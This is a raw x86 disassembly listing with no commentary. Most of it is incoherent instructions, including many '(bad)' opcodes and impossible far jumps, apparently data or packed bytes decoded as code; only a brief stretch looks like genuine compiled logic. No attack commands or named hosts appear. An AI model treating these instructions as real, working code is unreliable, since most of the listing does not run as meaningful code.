  40b185:	xchg   ebx,eax
  40b186:	sbb    bh,BYTE PTR [edx+0x3b]
  40b189:	jo     0x40b18c
  40b18b:	pop    edi
  40b18c:	aaa    
  40b18d:	repz xchg edx,eax
  40b18f:	rol    edx,0x84
  40b192:	(bad)  [eax]
  40b194:	mov    ecx,0xee97bdfe
  40b199:	mov    bh,0xc5
  40b19b:	jmp    0x457a:0x47d67b1c
  40b1a2:	aad    0x22
  40b1a4:	pop    esi
  40b1a5:	push   ds
  40b1a6:	clc    
  40b1a7:	mov    ebx,0x432fbc40
  40b1ac:	cld    
  40b1ad:	mov    cl,0x4d
  40b1af:	sub    eax,DWORD PTR [ecx]
  40b1b1:	fadd   st,st(6)
  40b1b3:	mov    DWORD PTR [eax-0x1d],eax
  40b1b6:	sti    
  40b1b7:	pop    ecx
  40b1b8:	mov    dh,0xde
  40b1ba:	lods   al,BYTE PTR ds:[esi]
  40b1bb:	mov    cl,0x99
  40b1bd:	cmp    al,0x83
  40b1bf:	dec    eax
  40b1c0:	inc    esp
  40b1c1:	(bad)  [esi]
  40b1c3:	mov    bh,0xe4
  40b1c5:	pusha  
  40b1c6:	adc    DWORD PTR [esi+eiz*2+0x58847820],0x43
  40b1ce:	in     eax,0x3d
  40b1d0:	(bad)  
  40b1d1:	push   ds
  40b1d2:	std    
  40b1d3:	add    eax,DWORD PTR [edx-0x65]
  40b1d6:	mov    eax,0x4b93ea88
  40b1db:	shr    DWORD PTR [edi+0x6a],0x8d
  40b1df:	iret   
  40b1e0:	xchg   edi,eax
  40b1e1:	sub    eax,0xa91e350e
  40b1e6:	jmp    0x40b1b8
  40b1e8:	mov    dh,0xdd
  40b1ea:	sub    al,0x38
  40b1ec:	jp     0x40b1ff
  40b1ee:	and    edx,DWORD PTR [edx-0x77]
  40b1f1:	aaa    
  40b1f2:	sbb    DWORD PTR [edi],ebx
  40b1f4:	fdecstp 
  40b1f6:	stc    
  40b1f7:	and    DWORD PTR ds:0xacff93fb,0xd17ba41b
  40b201:	pusha  
  40b202:	inc    ebx
  40b203:	outs   dx,DWORD PTR ds:[esi]
  40b204:	or     al,BYTE PTR [edi+0x22e1c6ab]
  40b20a:	in     al,0xd2
  40b20c:	mov    bl,0xff
  40b20e:	sub    eax,0x9c502edd
  40b213:	ds jmp 0x9e15:0xa06a4b4f
  40b21b:	mul    DWORD PTR [edx+0x10]
  40b21e:	fidiv  DWORD PTR [edx]
  40b220:	arpl   WORD PTR [edx],sp
  40b222:	lods   al,BYTE PTR ds:[esi]
  40b223:	pop    ds
  40b224:	pushf  
  40b225:	push   ds
  40b226:	and    DWORD PTR [ecx+0x568f5764],esi
  40b22c:	(bad)  
  40b22d:	push   ss
  40b22e:	and    edx,DWORD PTR [ebp-0x4b]
  40b231:	imul   edi,DWORD PTR [edx],0x4f
  40b234:	sbb    ebp,DWORD PTR [esi-0x1e7793b6]
  40b23a:	rcr    ch,1
  40b23c:	cli    
  40b23d:	lods   eax,DWORD PTR ds:[esi]
  40b23e:	dec    esi
  40b23f:	in     al,0x5f
  40b241:	cmp    eax,0x68dc4a5c
  40b246:	out    0xd3,eax
  40b248:	into   
  40b249:	pop    edx
  40b24a:	and    eax,DWORD PTR [edi-0x44df7022]
  40b250:	push   edx
  40b251:	mov    dh,0x6b
  40b253:	rol    bl,cl
  40b255:	and    ecx,0x29b94003
  40b25b:	ins    DWORD PTR es:[edi],dx
  40b25c:	dec    DWORD PTR [ecx+0x4c]
  40b25f:	into   
  40b260:	std    
  40b261:	add    al,0xf3
  40b263:	dec    edx
  40b264:	adc    DWORD PTR [ebp+0x495458b3],edi
  40b26a:	iret   
  40b26b:	or     eax,0x532eb452
  40b270:	(bad)  
  40b271:	dec    edi
  40b272:	mov    bh,0x9
  40b275:	rol    DWORD PTR [eax],cl
  40b277:	mov    dh,0x37
  40b279:	jns    0x40b288
  40b27b:	sub    eax,0xe6d3d9e5
  40b280:	hlt    
  40b281:	aas    
  40b282:	dec    eax
  40b283:	shr    esi,0x5d
  40b286:	push   ebp
  40b287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b288:	cmc    
  40b289:	popa   
  40b28a:	pop    ecx
  40b28b:	imul   edi,DWORD PTR [ecx+0x5b],0xd7077415
  40b292:	jecxz  0x40b24a
  40b294:	inc    edx
  40b295:	jns    0x40b30d
  40b297:	jns    0x40b27b
  40b299:	and    al,0xef
  40b29b:	shl    DWORD PTR [eax+eax*8+0x618626f6],1
  40b2a2:	sti    
  40b2a3:	pop    esi
  40b2a4:	mov    ?,edi
  40b2a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2a7:	into   
  40b2a8:	pushf  
  40b2a9:	dec    ecx
  40b2aa:	(bad)  
  40b2ab:	arpl   WORD PTR [ecx-0x3c16d87e],dx
  40b2b1:	call   0xf7d05e4c
  40b2b6:	push   ss
  40b2b7:	scas   eax,DWORD PTR es:[edi]
  40b2b8:	leave  
  40b2b9:	leave  
  40b2ba:	sbb    eax,0x5fdc30bb
  40b2bf:	enter  0x91ad,0x15
  40b2c3:	push   ss
  40b2c4:	in     eax,dx
  40b2c5:	mov    WORD PTR [ecx-0x22],es
  40b2c8:	mov    ecx,0x2b33466
  40b2cd:	or     ecx,0x7e
  40b2d0:	mov    ebx,esi
  40b2d2:	adc    ch,BYTE PTR [edx]
  40b2d4:	les    ebp,FWORD PTR [edx]
  40b2d6:	ss retf 
  40b2d8:	inc    ecx
  40b2d9:	(bad)  
  40b2da:	push   edi
  40b2db:	pop    es
  40b2dc:	and    BYTE PTR [ecx-0x28],ah
  40b2df:	pop    esi
  40b2e0:	fwait
  40b2e1:	xchg   edx,eax
  40b2e2:	outs   dx,BYTE PTR ds:[esi]
  40b2e3:	jmp    0x40b2a4
  40b2e5:	xor    DWORD PTR [eax],ebp
  40b2e7:	dec    edi
  40b2e8:	mov    dh,0x80
  40b2ea:	push   0x9ecd9d3c
  40b2ef:	pop    esi
  40b2f0:	ret    
  40b2f1:	ss pop esp
  40b2f3:	push   ebx
  40b2f4:	push   ds
  40b2f5:	or     esi,DWORD PTR [edx+eax*4]
  40b2f8:	je     0x40b36b
  40b2fa:	jae    0x40b307
  40b2fc:	inc    ebp
  40b2fd:	arpl   sp,sp
  40b2ff:	inc    edx
  40b300:	aad    0x66
  40b302:	mov    ch,BYTE PTR [bp+0x28]
  40b306:	cld    
  40b307:	xchg   BYTE PTR ds:0xabffbda7,dh
  40b30d:	mov    WORD PTR [edi+0x32],?
  40b310:	jl     0x40b298
  40b312:	outs   dx,DWORD PTR ds:[esi]
  40b313:	cwde   
  40b314:	retf   
  40b315:	cwde   
  40b316:	cs cmp eax,esi
  40b319:	pop    ss
  40b31a:	into   
  40b31b:	sar    DWORD PTR [ebx],1
  40b31d:	mov    WORD PTR ds:0x7e5275f9,gs
  40b323:	mov    DWORD PTR [eax-0x2e],edx
  40b326:	inc    edi
  40b327:	fdivrp st(5),st
  40b329:	in     eax,0xa4
  40b32b:	mov    ds:0xd82d4ff5,eax
  40b330:	inc    esi
  40b331:	mov    al,ds:0x114a89bc
  40b336:	mov    ds:0xa1ca4c50,al
  40b33b:	fwait
  40b33c:	cli    
  40b33d:	jg     0x40b2f5
  40b33f:	pop    ss
  40b340:	add    edx,DWORD PTR [edx-0x12]
  40b343:	inc    edx
  40b344:	mov    ebx,0xddaa957b
  40b349:	pop    ss
  40b34a:	test   eax,0x3e5c473c
  40b34f:	adc    DWORD PTR [edx+0x7836b087],edi
  40b355:	retf   
  40b356:	add    dh,BYTE PTR [esi-0x3d86ce3c]
  40b35c:	cdq    
  40b35d:	cs push es
  40b35f:	das    
  40b360:	ret    0xf61c
  40b363:	mov    ch,0x3f
  40b365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b366:	sbb    DWORD PTR [edx+0x3399cc75],esi
  40b36c:	pop    ebx
  40b36d:	jl     0x40b34a
  40b36f:	cmp    al,0x1c
  40b371:	test   DWORD PTR [edi+0xae987be],ecx
  40b377:	mov    edi,0x2ca465d9
  40b37c:	cwde   
  40b37d:	fcomp  DWORD PTR ds:0xf51aa695
  40b383:	scas   al,BYTE PTR es:[edi]
  40b384:	cmp    BYTE PTR [ebp+0x2],0x7b
  40b388:	inc    esi
  40b389:	(bad)  
  40b38a:	cmp    bl,BYTE PTR [ebx-0x31]
  40b38d:	out    dx,al
  40b38e:	rol    DWORD PTR ds:0x851ab756,1
  40b394:	leave  
  40b395:	sub    DWORD PTR [eax-0x76],esi
  40b398:	dec    ebp
  40b399:	ret    
  40b39a:	clc    
  40b39b:	and    eax,0x746752cc
  40b3a0:	or     bl,BYTE PTR [edx+0xb99de53]
  40b3a6:	xchg   esp,eax
  40b3a7:	inc    esi
  40b3a8:	push   esi
  40b3a9:	stos   BYTE PTR es:[edi],al
  40b3aa:	xchg   ecx,eax
  40b3ab:	xchg   ecx,eax
  40b3ac:	push   ss
  40b3ad:	dec    eax
  40b3ae:	in     al,0x15
  40b3b0:	mov    edx,0x5b9c826a
  40b3b5:	dec    eax
  40b3b6:	push   esi
  40b3b7:	jb     0x40b3de
  40b3b9:	pushf  
  40b3ba:	and    eax,0x9b989908
  40b3bf:	sbb    esp,DWORD PTR [ebx-0x70f25628]
  40b3c5:	pop    ebx
  40b3c6:	adc    eax,0x9c981909
  40b3cb:	neg    DWORD PTR [edi-0x1c]
  40b3ce:	and    DWORD PTR [ecx],ebp
  40b3d0:	or     al,0x72
  40b3d2:	je     0x40b3d7
  40b3d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3d5:	cmc    
  40b3d6:	fadd   QWORD PTR [esp+edi*1-0x7911945e]
  40b3dd:	pusha  
  40b3de:	ins    DWORD PTR es:[edi],dx
  40b3df:	cdq    
  40b3e0:	dec    esi
  40b3e1:	xchg   esi,eax
  40b3e2:	imul   eax,DWORD PTR [ebp-0x6b],0xa1627926
  40b3e9:	outs   dx,BYTE PTR ds:[esi]
  40b3eb:	(bad)  [edx+0x5690e9b9]
  40b3f1:	stc    
  40b3f2:	xchg   ebx,eax
  40b3f3:	jns    0x40b42f
  40b3f5:	retf   
  40b3f6:	les    esp,FWORD PTR [edi+0x28555c80]
  40b3fc:	out    0x5f,al
  40b3fe:	fwait
  40b3ff:	jbe    0x40b420
  40b401:	scas   al,BYTE PTR es:[edi]
  40b402:	iret   
  40b403:	sub    bh,BYTE PTR [edx]
  40b405:	sbb    ebx,DWORD PTR [edx-0x77]
  40b408:	add    eax,0x4ecdc3c1
  40b40d:	repnz dec DWORD PTR [ecx-0x22bbff71]
  40b414:	pop    ebp
  40b415:	ins    DWORD PTR es:[edi],dx
  40b416:	test   al,0xed
  40b418:	cmp    cl,cl
  40b41a:	aad    0x2f
  40b41c:	mov    eax,ds:0xa23c6dfb
  40b421:	cmp    ebx,ecx
  40b423:	add    bh,dl
  40b425:	leave  
  40b426:	jmp    0x40b437
  40b428:	jmp    0x3ea0:0x83cb149d
  40b42f:	in     eax,0x94
  40b431:	or     ebx,edi
  40b433:	dec    ecx
  40b434:	sub    edx,DWORD PTR [esi+0x66568aa7]
  40b43a:	mov    BYTE PTR [edi-0x10157152],bl
  40b440:	and    al,0xa
  40b442:	cli    
  40b443:	sub    edi,0x36225901
  40b449:	xchg   DWORD PTR [ecx-0x3a],ecx
  40b44c:	pop    eax
  40b44d:	sbb    dl,BYTE PTR [eax]
  40b44f:	sub    al,0x29
  40b451:	jmp    0xe6d7:0x78d46160
  40b458:	jecxz  0x40b457
  40b45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b45b:	out    dx,eax
  40b45c:	shl    BYTE PTR [edi-0xab9812b],0x82
  40b463:	call   0x82bc:0x4dbcc48f
  40b46a:	mov    edx,0xc88db760
  40b46f:	ret    0xfc90
  40b472:	push   cs
  40b473:	mov    edx,0x9bb02da2
  40b478:	daa    
  40b479:	jo     0x40b4c3
  40b47b:	lods   al,BYTE PTR ds:[esi]
  40b47c:	fndisi(8087 only) 
  40b47e:	add    esp,DWORD PTR [ebp+0x7b55b179]
  40b484:	mov    eax,0xaf20391a
  40b489:	inc    edx
  40b48a:	addr16 jge 0x40b45c
  40b48d:	mov    esi,0xe938379f
  40b492:	nop
  40b493:	or     ah,BYTE PTR ds:0x7e7ddbed
  40b499:	pop    ecx
  40b49a:	mov    WORD PTR [edi+0x7f7d341c],?
  40b4a0:	cmp    ecx,DWORD PTR [edx+0x7]
  40b4a3:	retf   0x1daa
  40b4a6:	out    dx,al
  40b4a7:	cdq    
  40b4a8:	mov    ds:0xf091c17,al
  40b4ad:	add    BYTE PTR ds:0xd246f9e1,0xa
  40b4b4:	cdq    
  40b4b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4b6:	shl    DWORD PTR [esi-0x20c8e981],0xd6
  40b4bd:	sub    eax,0x5e666dc4
  40b4c2:	ins    BYTE PTR es:[edi],dx
  40b4c3:	push   0x35e1fe01
  40b4c8:	and    DWORD PTR [ecx],eax
  40b4ca:	repnz pop es
  40b4cc:	mov    dh,0xf8
  40b4ce:	push   es
  40b4cf:	aaa    
  40b4d0:	mov    al,0x2b
  40b4d2:	add    ah,BYTE PTR [ecx+0x7eeddf0f]
  40b4d8:	shl    BYTE PTR [eax],1
  40b4da:	test   al,0xc
  40b4dc:	popf   
  40b4dd:	into   
  40b4de:	push   cs
  40b4df:	adc    DWORD PTR [ebp+eiz*2+0x34],0xffffffcc
  40b4e4:	push   esp
  40b4e5:	imul   esp,DWORD PTR [eax],0x77
  40b4e8:	add    eax,0xe881b43e
  40b4ed:	pusha  
  40b4ee:	(bad)  
  40b4ef:	cmp    al,0xe8
  40b4f1:	cmp    DWORD PTR [edx],esi
  40b4f3:	mov    ch,0xfa
  40b4f5:	dec    ebx
  40b4f6:	mov    ebp,0xdeb9cd5d
  40b4fb:	sub    al,0x56
  40b4fd:	xor    BYTE PTR [eax+0x67],dl
  40b500:	inc    BYTE PTR [edi+0x13c8bed9]
  40b506:	jbe    0x40b55a
  40b508:	xor    al,0xe5
  40b50a:	rcl    edi,1
  40b50c:	xchg   ebx,eax
  40b50d:	sbb    eax,0xcc468058
  40b512:	pop    es
  40b513:	push   es
  40b514:	jle    0x40b4ae
  40b516:	push   ebp
  40b517:	xchg   esi,eax
  40b518:	fwait
  40b519:	xor    DWORD PTR [eax-0x23],edx
  40b51c:	push   ebx
  40b51d:	jns    0x40b58f
  40b51f:	cmp    cl,BYTE PTR [edi]
  40b521:	scas   eax,DWORD PTR es:[edi]
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	rcr    dh,1
  40b551:	dec    ebx
  40b552:	xchg   ecx,eax
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b542
  40b55c:	jo     0x40b5bc
  40b55e:	sub    ecx,DWORD PTR [ebx]
  40b560:	loopne 0x40b5d8
  40b562:	lahf   
  40b563:	ins    DWORD PTR es:[edi],dx
  40b564:	(bad)  
  40b565:	gs int3 
  40b567:	outs   dx,DWORD PTR ds:[esi]
  40b568:	ins    BYTE PTR es:[edi],dx
  40b569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b56a:	mov    ss,eax
  40b56c:	mov    eax,ds:0xe86f8139
  40b571:	into   
  40b572:	push   es
  40b573:	pop    edi
  40b574:	xchg   esi,eax
  40b575:	fcom   DWORD PTR [edi-0x6eec8ad4]
  40b57b:	xor    BYTE PTR [esi],0xd2
  40b57e:	xchg   edi,eax
  40b57f:	(bad)  
  40b580:	jmp    0x573167b8
  40b585:	dec    eax
  40b586:	(bad)  
  40b587:	mov    al,0xed
  40b589:	xchg   ecx,eax
  40b58a:	jmp    0x8ee4cb92
  40b58f:	jge    0x40b56a
  40b591:	lea    esi,[eax+ecx*8-0x71]
  40b595:	jo     0x40b5be
  40b597:	add    esp,DWORD PTR [edi-0x28]
  40b59a:	ss push esi
  40b59c:	jns    0x40b5b8
  40b59e:	xchg   edi,eax
  40b59f:	mov    edi,0xaa68f1e1
  40b5a4:	xchg   BYTE PTR [ecx-0x778870eb],ah
  40b5aa:	xchg   DWORD PTR [edx],edi
  40b5ac:	mov    eax,0x53489fcd
  40b5b1:	push   ecx
  40b5b2:	pop    DWORD PTR [ebp-0x53]
  40b5b5:	xchg   edi,eax
  40b5b6:	dec    ecx
  40b5b7:	and    dh,dl
  40b5b9:	push   ss
  40b5ba:	cmp    al,0x80
  40b5bc:	sti    
  40b5bd:	retf   
  40b5be:	stos   DWORD PTR es:[edi],eax
  40b5bf:	cdq    
  40b5c0:	int    0xbd
  40b5c2:	cmp    BYTE PTR [edi],0xe2
  40b5c5:	nop
  40b5c6:	scas   al,BYTE PTR es:[edi]
  40b5c7:	pop    edi
  40b5c8:	shl    DWORD PTR [esi],cl
  40b5ca:	push   ebp
  40b5cb:	xchg   esp,eax
  40b5cc:	add    esp,eax
  40b5ce:	adc    eax,0x6510664f
  40b5d3:	cmp    DWORD PTR [esi-0x27e984ec],0xa847554e
  40b5dd:	inc    esi
  40b5de:	jmp    0x2d88ba6e
  40b5e3:	inc    ecx
  40b5e4:	lods   al,BYTE PTR ds:[esi]
  40b5e5:	add    bh,BYTE PTR [edx]
  40b5e7:	inc    esi
  40b5e8:	call   0x530a:0x9f5341c
  40b5ef:	and    BYTE PTR [edx],al
  40b5f1:	mov    dh,0x19
  40b5f3:	aad    0x27
  40b5f5:	fnstsw WORD PTR [edx-0x1256a553]
  40b5fb:	imul   edi,DWORD PTR [edi],0xbe0ab1ef
  40b601:	ror    BYTE PTR [eax-0x1347f8b8],0x31
  40b608:	push   ss
  40b609:	leave  
  40b60a:	call   0xeb1c:0xcca9848f
  40b611:	iret   
  40b612:	retf   
  40b613:	sbb    edx,DWORD PTR [eax+0x43859c6]
  40b619:	fild   DWORD PTR [edx-0x7b]
  40b61c:	sar    DWORD PTR [eax],0xd5
  40b61f:	lock mov esp,0xef4815f
  40b625:	sar    edi,cl
  40b627:	mov    dl,0xaf
  40b629:	fstp   QWORD PTR [ebx]
  40b62b:	jle    0x40b5e6
  40b62d:	fsubr  st(6),st
  40b62f:	pop    edi
  40b630:	out    dx,eax
  40b631:	jne    0x40b5b9
  40b633:	xchg   ebx,eax
  40b634:	mov    bh,0x82
  40b636:	aam    0xac
  40b638:	xor    ecx,DWORD PTR [ecx]
  40b63a:	out    dx,eax
  40b63b:	mov    bh,0x46
  40b63d:	repnz inc edx
  40b63f:	add    eax,0xfae976a9
  40b644:	mov    dh,0x7d
  40b646:	jnp    0x40b62d
  40b648:	add    BYTE PTR [edx+0x76e09005],ch
  40b64e:	sahf   
  40b64f:	test   DWORD PTR [ebx-0x11],0x8c1aefb3
  40b656:	xor    eax,0xb048c6bd
  40b65b:	or     eax,0x78a4deaa
  40b660:	push   0xffffffe5
  40b662:	popa   
  40b663:	and    BYTE PTR [edx+0x63],ch
  40b666:	and    DWORD PTR [edx-0x6b],edi
  40b669:	int    0xec
  40b66b:	jnp    0x40b68b
  40b66d:	mov    ch,0x15
  40b66f:	xor    DWORD PTR [esp+ebp*8-0x7a69342b],esp
  40b676:	cmp    DWORD PTR [edi],edi
  40b678:	sbb    DWORD PTR [edi-0x7c534e43],0xffffffd7
  40b67f:	stc    
  40b680:	test   al,ah
  40b682:	fisubr WORD PTR [eax]
  40b684:	mov    ch,0xb6
  40b686:	jnp    0x40b637
  40b688:	ret    
  40b689:	inc    edi
  40b68a:	sahf   
  40b68b:	sub    ah,BYTE PTR [ecx]
  40b68d:	mov    ds:0xe7f81357,eax
  40b692:	inc    ecx
  40b693:	(bad)
  40b696:	push   0xa9f7e144
  40b69b:	add    al,0x96
  40b69d:	out    dx,al
  40b69e:	xchg   esp,eax
  40b69f:	xchg   ebx,eax
  40b6a0:	pushf  
  40b6a1:	xchg   esi,eax
  40b6a2:	dec    edi
  40b6a3:	mov    gs,edx
  40b6a5:	pusha  
  40b6a6:	xchg   esp,eax
  40b6a7:	gs mov esi,0x46dabf53
  40b6ad:	imul   ecx,DWORD PTR [edx],0xffffffa9
  40b6b0:	in     al,0x8e
  40b6b2:	push   esp
  40b6b3:	rcr    BYTE PTR [ebx+0x627ab4a2],1
  40b6b9:	or     esi,DWORD PTR [esi+0x61d33e96]
  40b6bf:	(bad)  
  40b6c0:	mov    esp,0xd99596f6
  40b6c5:	inc    ecx
  40b6c6:	mov    cl,bl
  40b6c8:	jne    0x40b71c
  40b6ca:	jmp    0xa0c1:0xda1c5ed3
  40b6d1:	xor    eax,0x5337c1ae
  40b6d6:	(bad)  
  40b6d7:	retf   0x28b9
  40b6da:	sar    DWORD PTR [ebx-0x3],0x82
  40b6de:	mov    al,ds:0x22043358
  40b6e3:	adc    DWORD PTR [ebx+0x7],edi
  40b6e6:	retf   
  40b6e7:	jle    0x40b675
  40b6e9:	jg     0x40b6a3
  40b6eb:	pusha  
  40b6ec:	leave  
  40b6ed:	fwait
  40b6ee:	mov    dh,0x1a
  40b6f0:	xchg   esi,eax
  40b6f1:	inc    edx
  40b6f2:	jno    0x40b705
  40b6f4:	push   ecx
  40b6f5:	icebp  
  40b6f6:	cs inc eax
  40b6f8:	mov    ds:0x2bb2bfa0,al
  40b6fd:	sub    esi,esp
  40b6ff:	mov    bl,0x68
  40b701:	adc    DWORD PTR [edx+esi*2+0x3a],eax
  40b705:	in     al,dx
  40b706:	imul   esi,DWORD PTR [edi-0x11],0x1735fd13
  40b70d:	mov    ebx,0x2c3198b0
  40b712:	push   cs
  40b713:	loope  0x40b69b
  40b715:	xor    BYTE PTR [ecx+0x27],ah
  40b718:	int    0x12
  40b71a:	sub    ecx,DWORD PTR [edx-0x64]
  40b71d:	adc    al,0xf6
  40b71f:	ror    esp,0x57
  40b722:	xchg   ebp,eax
  40b723:	mov    ebp,esp
  40b725:	sbb    dl,ch
  40b727:	stos   DWORD PTR es:[edi],eax
  40b728:	jno    0x40b6ba
  40b72a:	out    dx,al
  40b72b:	pusha  
  40b72c:	mov    edx,?
  40b72e:	mov    ds,ebp
  40b730:	cld    
  40b731:	test   cl,dh
  40b733:	aas    
  40b734:	mov    eax,ds:0x93ae1044
  40b739:	lock dec edx
  40b73b:	mov    edi,0xeabd86e7
  40b740:	inc    edi
  40b741:	and    BYTE PTR [edx+0x5ba5763d],cl
  40b747:	adc    cl,BYTE PTR [ebp-0x6fb3d3e0]
  40b74d:	test   DWORD PTR [ebx],edx
  40b74f:	fs pop esi
  40b751:	jno    0x40b772
  40b753:	push   ss
  40b754:	jnp    0x40b743
  40b756:	mov    eax,0x68abbc37
  40b75b:	sbb    esp,DWORD PTR [edx+ebp*2-0x41e1be4d]
  40b762:	adc    ecx,0xffffffcc
  40b765:	xchg   BYTE PTR [ebx],bh
  40b767:	jge    0x40b772
  40b769:	add    eax,0x57899b0b
  40b76e:	int3   
  40b76f:	xor    DWORD PTR [esi],edx
  40b771:	shl    DWORD PTR [edx-0x60],cl
  40b774:	xor    eax,0xa272b2c7
  40b779:	repz sub BYTE PTR [ecx],dl
  40b77c:	inc    ecx
  40b77d:	sbb    edi,DWORD PTR [edi+ebp*2+0x1d28d7c8]
  40b784:	(bad)  
  40b785:	sti    
  40b786:	pop    edi
  40b787:	adc    bl,BYTE PTR [edi]
  40b789:	into   
  40b78a:	mov    ebx,0x666908b1
  40b78f:	aaa    
  40b790:	jp     0x40b717
  40b792:	cli    
  40b793:	imul   ebx,edx,0xffffff93
  40b796:	push   eax
  40b797:	aaa    
  40b798:	ins    DWORD PTR es:[edi],dx
  40b799:	lods   eax,DWORD PTR ds:[esi]
  40b79a:	pop    ss
  40b79b:	add    BYTE PTR [ebx-0x80],0xfc
  40b79f:	cmp    eax,0x6cc076b8
  40b7a4:	dec    edi
  40b7a6:	or     edi,esp
  40b7a8:	and    eax,0x823b0f65
  40b7ad:	not    DWORD PTR [ebx]
  40b7af:	or     eax,0x387af558
  40b7b4:	sahf   
  40b7b5:	fidivr WORD PTR [ebx]
  40b7b7:	fmul   st(0),st
  40b7b9:	dec    esi
  40b7ba:	std    
  40b7bb:	popa   
  40b7bc:	adc    BYTE PTR ds:0x318b146a,dh
  40b7c2:	mov    DWORD PTR [edx],ecx
  40b7c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7c5:	and    DWORD PTR [eax+0x75e4ae91],ecx
  40b7cb:	mov    ds:0xfa3fcb41,al
  40b7d0:	js     0x40b7c0
  40b7d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7d3:	dec    esi
  40b7d4:	call   0x77b:0x4d214b55
  40b7db:	test   BYTE PTR [ebp-0x14c7bac2],bl
  40b7e1:	lock cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  40b7e4:	iret   
  40b7e5:	add    eax,0x224a57c5
  40b7ea:	inc    ebx
  40b7eb:	inc    esp
  40b7ec:	mov    ebx,0x1946517a
  40b7f1:	addr16 daa 
  40b7f3:	sub    eax,0xf8d562cf
  40b7f8:	xchg   edi,eax
  40b7f9:	ret    
  40b7fa:	mov    gs,WORD PTR [ecx+0x3a]
  40b7fd:	aaa    
  40b7fe:	jmp    0xb9647617
  40b803:	mov    edx,0x52df2599
  40b808:	out    dx,eax
  40b809:	jle    0x40b86a
  40b80b:	cwde   
  40b80c:	ja     0x40b85e
  40b80e:	push   ebp
  40b80f:	out    dx,al
  40b810:	pop    ds
  40b811:	imul   bp,bx,0xeff4
  40b816:	scas   al,BYTE PTR es:[edi]
  40b817:	hlt    
  40b818:	mov    ch,0x94
  40b81a:	mov    cl,0x18
  40b81c:	not    BYTE PTR [edx+0x20]
  40b81f:	ret    
  40b820:	sti    
  40b821:	pop    ecx
  40b822:	scas   al,BYTE PTR es:[edi]
  40b823:	dec    ebx
  40b824:	arpl   WORD PTR [edi+0x12bdbae5],cx
  40b82a:	ins    BYTE PTR es:[edi],dx
  40b82b:	aas    
  40b82c:	(bad)  [edi+0x17b5b1a9]
  40b832:	test   ecx,ebx
  40b834:	les    ebp,FWORD PTR [esi-0x7]
  40b837:	xchg   esi,eax
  40b838:	std    
  40b839:	dec    ebp
  40b83a:	pusha  
  40b83b:	mov    ecx,0xa764e2c3
  40b840:	dec    edi
  40b841:	clc    
  40b842:	ins    DWORD PTR es:[edi],dx
  40b843:	cdq    
  40b844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b845:	mov    dl,0xa4
  40b847:	mov    ch,BYTE PTR [ebp-0x4c]
  40b84a:	into   
  40b84b:	pop    ss
  40b84c:	call   0xa1a9b7a8
  40b851:	jnp    0x40b814
  40b853:	lods   al,BYTE PTR ds:[esi]
  40b854:	popf   
  40b855:	test   al,0x8f
  40b857:	or     bl,BYTE PTR [eax+0x3b55750c]
  40b85d:	mov    edi,0x57f20433
  40b862:	xchg   esi,eax
  40b863:	mov    edx,0xdd0be420
  40b868:	inc    ebx
  40b869:	out    dx,al
  40b86a:	imul   ebx,DWORD PTR [edi-0x45],0x7f
  40b86e:	in     al,0x95
  40b870:	std    
  40b871:	push   0xffffffd2
  40b873:	pop    ebp
  40b874:	imul   ebx,DWORD PTR [eax],0x8820fc64
  40b87a:	rol    BYTE PTR [edi],1
  40b87c:	(bad)  
  40b87d:	(bad)  
  40b87f:	ins    DWORD PTR es:[edi],dx
  40b880:	nop
  40b881:	pop    es
  40b882:	push   es
  40b883:	add    al,0x3d
  40b885:	test   eax,0xd30f6085
  40b88a:	imul   ecx,esp,0x7
  40b88d:	or     al,0x89
  40b88f:	adc    eax,0xbc063527
  40b894:	jecxz  0x40b908
  40b896:	push   0xedddee15
  40b89b:	cmp    dl,BYTE PTR [ecx+0x73]
  40b89e:	stc    
  40b89f:	hlt    
  40b8a0:	jl     0x40b91b
  40b8a2:	xor    BYTE PTR [ebp+0x13],bl
  40b8a5:	jge    0x40b90e
  40b8a7:	push   ds
  40b8a8:	test   DWORD PTR [edi],esp
  40b8aa:	cmp    edx,DWORD PTR [eax-0x305dbecd]
  40b8b0:	bound  eax,QWORD PTR [eax-0x580b3248]
  40b8b6:	dec    esi
  40b8b7:	adc    dh,BYTE PTR [ebx+0x30c46c7a]
  40b8bd:	shr    esi,0xb9
  40b8c0:	jnp    0x40b89e
  40b8c2:	mov    bh,0x90
  40b8c4:	mov    eax,edx
  40b8c6:	xor    BYTE PTR [edx],0x46
  40b8c9:	lods   al,BYTE PTR ds:[esi]
  40b8ca:	cs jle 0x40b8fe
  40b8cd:	iret   
  40b8ce:	mov    edx,0x3778dc6c
  40b8d3:	lock jge 0x40b921
  40b8d6:	mov    dh,0xae
  40b8d8:	(bad)  
  40b8d9:	fidiv  WORD PTR [ebp+0x7e752532]
  40b8df:	pop    es
  40b8e0:	fisttp WORD PTR [edi]
  40b8e2:	xchg   esi,eax
  40b8e3:	xor    DWORD PTR [ebx-0x3b932d37],edi
  40b8e9:	div    ah
  40b8eb:	cdq    
  40b8ec:	and    BYTE PTR [esi+0x281a3826],bh
  40b8f2:	jecxz  0x40b969
  40b8f4:	cld    
  40b8f5:	pop    esi
  40b8f6:	xor    eax,0xea501354
